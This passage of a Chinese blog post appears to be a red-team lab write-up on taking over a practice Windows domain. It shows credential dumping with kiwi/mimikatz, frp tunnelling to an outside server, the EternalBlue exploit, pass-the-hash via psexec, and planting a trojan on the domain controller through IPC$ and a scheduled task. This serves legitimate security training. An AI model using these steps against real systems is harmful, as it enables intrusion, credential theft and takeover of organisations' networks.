<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/12.png" class="">

<p>Kali成功监听到.</p>
<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>

<h5 id="迁移木马进程"><a href="#迁移木马进程" class="headerlink" title="迁移木马进程"></a>迁移木马进程</h5><p>查看权限为adminintrator权限,直接通过getsystem提升至system权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tasklist</span><br></pre></td></tr></table></figure>

<h5 id="查看是否有杀软"><a href="#查看是否有杀软" class="headerlink" title="查看是否有杀软"></a>查看是否有杀软</h5><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/13.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Systeminfo</span><br></pre></td></tr></table></figure>

<h5 id="查看系统详细信息打的有什么补丁方便后续渗透"><a href="#查看系统详细信息打的有什么补丁方便后续渗透" class="headerlink" title="查看系统详细信息打的有什么补丁方便后续渗透"></a>查看系统详细信息打的有什么补丁方便后续渗透</h5><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/14.png" class="">

<p>查看是否存在域</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/15.png" class="">

<h5 id="存在域god"><a href="#存在域god" class="headerlink" title="存在域god"></a>存在域god</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br></pre></td></tr></table></figure>

<h6 id="获取本地管理员（通常包含域用户）信息"><a href="#获取本地管理员（通常包含域用户）信息" class="headerlink" title="获取本地管理员（通常包含域用户）信息"></a>获取本地管理员（通常包含域用户）信息</h6><img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/16.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view  /domain:god       # 查看局域网内其他主机名</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/17.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Load kiwi</span><br></pre></td></tr></table></figure>

<h6 id="模块爆破密码"><a href="#模块爆破密码" class="headerlink" title="模块爆破密码"></a>模块爆破密码</h6><p>(原理:域管理员或其他用户使用自己的密码登录该计算机登录到域时,密码会存放在该计算机内存中,可以用kiwi模块中获取密码命令进行提取内存中的密码或者hash)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashdump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/18.png" class="">

<p>爆破出了管理员的密码尝试进行登录发现提示管理员在线我们如果强行进行登录会引起对方怀疑.这里有两个思路.</p>
<p>思路一:使用rdpwrap工具隐藏我们的远程连接绕过管理员连接到目标靶机进行渗透,这里因为考虑到目标机缺少缺少很多我们需要的工具,进行第二种思路.</p>
<h5 id="kali挂代理通内网进行渗透"><a href="#kali挂代理通内网进行渗透" class="headerlink" title="kali挂代理通内网进行渗透"></a>kali挂代理通内网进行渗透</h5><p>因为我的msf不稳定挂代理总容易掉,这里我决定用frp＋sockets进行代理对内网进行渗透.</p>
<p>先通过蚁剑给靶机远程下载frp工具并代理至我的公网服务器.</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/19.png" class="">

<p>服务器开启代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x frps //给frps执行权限</span><br><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>靶机进行连接.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/20.png" class="">

<p>靶机成功连接上去</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/21.png" class="">

<h6 id="Kali将公网服务器ip加转发端口加入到代理链中"><a href="#Kali将公网服务器ip加转发端口加入到代理链中" class="headerlink" title="Kali将公网服务器ip加转发端口加入到代理链中"></a>Kali将公网服务器ip加转发端口加入到代理链中</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf  </span><br><span class="line">socket 代理服务器ip:端口号 //添加代理链</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/22.png" class="">

<p>尝试通过内网ip访问一下web靶机可以成功访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &quot;http://192.168.148.128/l.php&quot; </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/23.png" class="">

<p>通过代理打开msf进行横向渗透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 msfdb run </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/24.png" class="">

<p>之前已经对内网存在的目标信息收集过直接进行攻击</p>
<p>对192.168.148.129(域控所在服务器)主机进行端口扫描查看开启的服务`</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT -p80,445 192.168.148.1289</span><br></pre></td></tr></table></figure>

<p>发现其开启了445端口尝试进行永恒之蓝攻击,结果一不小心打蓝屏了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/25.png" class="">

<p>最后试了三次才成功,实战中不推荐这种方式,太狗血了.</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/26.png" class="">

<p>因为这里的不稳定性,我决定把msf上win7的shell反弹给cs,通过cs的一些工具在尝试获取一下域控的权限</p>
<p>先把公网服务器上线到cs,然后反弹shell给cs msf和cs互动请参考文章:<a href="https://cloud.tencent.com/developer/article/1785155">https://cloud.tencent.com/developer/article/1785155</a></p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/27.png" class="">

<p>上线成功</p>
<p>部分信息之前在msf的shell中已经收集过了</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/28.png" class="">

<p>域名为 god</p>
<p>域中有三台主机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stu1.god.org  192.168.148.128(控制的这台win 7)</span><br><span class="line"></span><br><span class="line">root-tvi862ubeh.god.org  192.168.148.130</span><br><span class="line"></span><br><span class="line">owa.god.org  192.168.148.129 为域控</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户有 : ligang , liukaifeng01 ,administrator</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域管理员只有一个： administrator</span><br></pre></td></tr></table></figure>

<p>密码也通过kiwi模块扫出来了</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/29.png" class="">

<p>前面我们已经通过收集信息得知DC是192.168.148.129这台机器,可以直接想办法拿到域控,因为前面已经通过hashdump和logonpassword命令获取到了域管理员的密码hash和铭文,我直接借助psexec票据传递尝试去拿域控的权限</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/30.png" class="">

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/31.png" class="">

<p>成功的获取到了域控的shell,通过同样的方式拿到域内另外一台机器的shell</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/32.png" class="">

<p>最后三台服务器都成功拿到了权限,这里同样可以通过msf的自带的psexec模块进行hash碰撞攻击.</p>
<h6 id="IPCIPC-amp-amp-计划任务上传木马"><a href="#IPCIPC-amp-amp-计划任务上传木马" class="headerlink" title="IPCIPC$&amp;&amp;计划任务上传木马"></a>IPCIPC$&amp;&amp;计划任务上传木马</h6><p>也可以通过IPC$&amp;&amp;计划任务通过cs上传木马到跳板机win7,让跳板机尝试通过IPC服务连接到域控,将木马上传到域控的共享文件夹下面.</p>
<p>和上面一样先开启监听然后生成木马,上面得知域控开启了IPC对应的服务端口139.</p>
<p>通过cs与win7的会话尝试连接域控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell net use \\192.168.148.129\ipc$ /user:&quot;用户名&quot; &quot;密码&quot;</span><br><span class="line">beacon&gt; shell net view \\192.168.148.129 </span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/33.png" class="">

<p>这里成功连接上域控的IPC资源共享服务</p>
<p>查看域控的C盘文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell dir \\192.168.148.129\c$</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/34.png" class="">

<p>先将本地木马上传到win7,然后通过win7上传到域控内</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell copy tiaoban.exe \\192.168.148.129\C$</span><br></pre></td></tr></table></figure>

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/35.png" class="">

<p>上传成功</p>
<p>创建计划任务并执行</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/36.png" class="">

<h5 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h5><p>同样的这里还有两种猜想思路:①信息收集发现域内存在一台krbtgt开头的域内用户,后面百度得知,该用户是kerberos生成的用户,专门为认证后的用户发放票据的,可以利用他进行随意伪造用户票据登录.</p>
<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/37.png" class="">

<img src="/2021/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%B8%80%E7%BB%83%E4%B9%A0/38.png" class="">

<p>可以看到这台计算机可以选择登录到域或者直接在本地计算机登录,这里我们拿到的是普通用户的域权限时,可以先绕过域通过本地的管理员账户登陆本地计算机然后远程上传kiwi程序,对内存的密码进行提取在用psexec进行登录.</p>
]]></content>
      <categories>
        <category>内网学习</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>日志注入</tag>
      </tags>
  </entry>
</search>
